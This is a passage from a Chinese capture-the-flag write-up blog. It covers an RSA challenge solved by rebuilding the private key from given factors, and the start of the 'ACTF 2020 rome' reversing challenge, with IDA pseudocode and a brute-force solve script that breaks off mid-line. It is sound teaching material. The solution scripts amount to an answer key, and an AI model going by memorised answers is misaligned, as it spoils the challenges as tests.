<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">285960468890451637935629440372639283459</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">304008741604601924494328155975272418463</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220403130205691.png" alt="image-20220403130205691" /></p>
<p>exp：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> rsa</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>p <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span></pre></td></tr><tr><td data-num="5"></td><td><pre>q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span></pre></td></tr><tr><td data-num="6"></td><td><pre>n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></pre></td></tr><tr><td data-num="7"></td><td><pre>e <span class="token operator">=</span> <span class="token number">65537</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span>e<span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.enc"</span><span class="token punctuation">,</span><span class="token string">"rb+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    f <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>f<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220403131038702.png" alt="image-20220403131038702" /></p>
<h2 id="actf新生赛2020rome"><a class="anchor" href="#actf新生赛2020rome">#</a> [ACTF 新生赛 2020] rome</h2>
<p>得到的 flag 请包上 flag {} 提交。</p>
<p>查壳，无壳且 32 位</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404204605627.png" alt="image-20220404204605627" /></p>
<p>ida 查看</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404204656203.png" alt="image-20220404204656203" /></p>
<p>跟进_func_</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404204802951.png" alt="image-20220404204802951" /></p>
<p>f5 反编译</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2022/image-20220404204821126.png" alt="image-20220404204821126" /></p>
<p>查看字符串，定位，查看伪代码</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">int</span> v1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-44h]</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">unsigned</span> __int8 v2<span class="token punctuation">;</span> <span class="token comment">// [esp+24h] [ebp-34h] BYREF</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">unsigned</span> __int8 v3<span class="token punctuation">;</span> <span class="token comment">// [esp+25h] [ebp-33h]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">unsigned</span> __int8 v4<span class="token punctuation">;</span> <span class="token comment">// [esp+26h] [ebp-32h]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">unsigned</span> __int8 v5<span class="token punctuation">;</span> <span class="token comment">// [esp+27h] [ebp-31h]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">unsigned</span> __int8 v6<span class="token punctuation">;</span> <span class="token comment">// [esp+28h] [ebp-30h]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+29h] [ebp-2Fh]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+2Dh] [ebp-2Bh]</span></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+31h] [ebp-27h]</span></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+35h] [ebp-23h]</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token keyword">unsigned</span> __int8 v11<span class="token punctuation">;</span> <span class="token comment">// [esp+39h] [ebp-1Fh]</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  <span class="token keyword">char</span> v12<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token function">strcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token string">"Qsw3sj_lz4_Ujw@l"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>  result <span class="token operator">=</span> v2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">65</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    result <span class="token operator">=</span> v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token number">67</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>      result <span class="token operator">=</span> v4<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">84</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre>      <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        result <span class="token operator">=</span> v5<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">70</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>          result <span class="token operator">=</span> v6<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">==</span> <span class="token number">123</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>            result <span class="token operator">=</span> v11<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">==</span> <span class="token number">125</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="37"></td><td><pre>            <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="38"></td><td><pre>              v1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>              v1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>              v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>              v1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="42"></td><td><pre>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="44"></td><td><pre>              <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="50"></td><td><pre>              <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="51"></td><td><pre>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="52"></td><td><pre>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="53"></td><td><pre>              <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v12<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>              <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>              <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre>  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="67"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>下面是字符串操作的部分</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>              <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">64</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">90</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">65</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>                  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">79</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span> <span class="token operator">+</span> <span class="token number">97</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>              <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>              <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">15</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>              <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v12<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>              <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>和上面的 V12 后面的字符串相等才可以</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token punctuation">(</span>_BYTE<span class="token punctuation">)</span>result <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>                  <span class="token keyword">return</span> result<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>                <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v12<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>编写 exp 脚本：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment"># -*- coding:utf-8 -*-</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>key <span class="token operator">=</span> <span class="token string">'Qsw3sj_lz4_Ujw@l'</span></pre></td></tr><tr><td data-num="4"></td><td><pre>flag <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        x <span class="token operator">=</span> 